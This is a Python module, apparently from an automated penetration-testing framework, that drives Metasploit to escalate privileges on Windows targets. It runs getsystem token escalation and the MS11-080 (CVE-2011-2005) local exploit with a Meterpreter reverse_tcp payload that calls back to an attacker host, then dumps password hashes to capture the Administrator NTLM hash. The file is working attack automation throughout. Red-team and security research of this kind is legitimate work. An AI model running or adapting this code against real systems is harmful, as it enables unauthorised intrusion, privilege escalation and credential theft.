# Module providing Priviledge Escalation exploits
#
# Author: Daniel Crouch
# Date created: March 2020

import os
import re
import time
import subprocess
from pathlib import Path
from dotenv import load_dotenv
# global variables
import config


################################################################################
# Priviledge Escalation commands
################################################################################

class PriviledgeEsc(object):
    """
    Defines a collection priviledge escalation commands and exploits
    """

    def update_priviledes(self, target_name, verbose = True):
        """
        User priviledges from meterpreter
        """
        target = config.TARGETS[target_name]
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # open session with target
        config.MSFCONSOLE.open_session(target_name)
        # search target priv and update model
        cmd = "getuid"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        if 'AUTHORITY' in msf_reply:
            target.access = 'admin'
        else:
            target.access = 'user'
        # background session
        config.MSFCONSOLE.background_session(target_name)

    def exploit_tokens(self, target_name, verbose=True):
        """
        Escalate priviledges with meterpreter token methods
        """
        target = config.TARGETS[target_name]
        target.action_history.append("exploit_tokens")
        original_access = target.access
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # open session with target
        config.MSFCONSOLE.open_session(target_name)
        # attempt to escalate privs
        cmd = "getsystem"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        config.MSFCONSOLE.background_session(target_name)
        # attempt to update privs
        self.update_priviledes(target_name, verbose)
        if verbose:
            current_access = target.access
            if current_access != original_access:
                print("[+] priviledge escalation:", original_access, "=>", current_access)
                return
            else:
                print("[-] escalation via tokens failed ")
        # background session

    def exploit_cve_2011_2005(self, target_name, verbose=True):
        """
        Escalate priviledges with ms11_080 exploit
        """
        target = config.TARGETS[target_name]
        target.action_history.append("exploit_cve_2011_2005")
        original_access = target.access
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # setup exploit
        cmd = "use exploit/windows/local/ms11_080_afdjoinleaf"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set SESSION " + target.session_id
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set payload windows/meterpreter/reverse_tcp"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set LHOST " + config.MSF_LHOST
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        # run exploit
        config.MSFCONSOLE.set_active_session()
        cmd = "exploit"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=22)
        # handle result
        for line in msf_reply.splitlines():
            if 'Meterpreter session' in line:
                words = line.split()
                target.session_id = words[3]
                config.MSFCONSOLE.background_session(target_name)
                print("[*] exploit successful, session id:", words[3])
                break
        # update user priviledges
        config.PRIVILEDGEESC.update_priviledes(target_name)

    def exploit_hashdump(self, target_name, verbose=True):
        """
        Collect administrator
        """
        target = config.TARGETS[target_name]
        target.action_history.append("exploit_hashdump")
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # open session with target
        config.MSFCONSOLE.open_session(target_name)
        # attempt to find administrator hash
        cmd = "hashdump"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=3)
        msf_reply = msf_reply.replace('\r','')
        msf_reply = msf_reply.replace('\n','')
        msf_reply = msf_reply.replace(':::','\n')

        for line in msf_reply.splitlines():
            if 'Administrator' in line.split(':'):
                items = line.split(':')
                hash = items[2] + ':' + items[3]
                target.admin_user = 'Administrator'
                target.admin_hash = hash
                config.MSFCONSOLE.background_session(target_name)
                print("[+] administrator password hash added:")
                print("    " + hash)
                print()
                return
        config.MSFCONSOLE.background_session(target_name)
        print("[-] unable to collect administrator password hash")
        print()





#
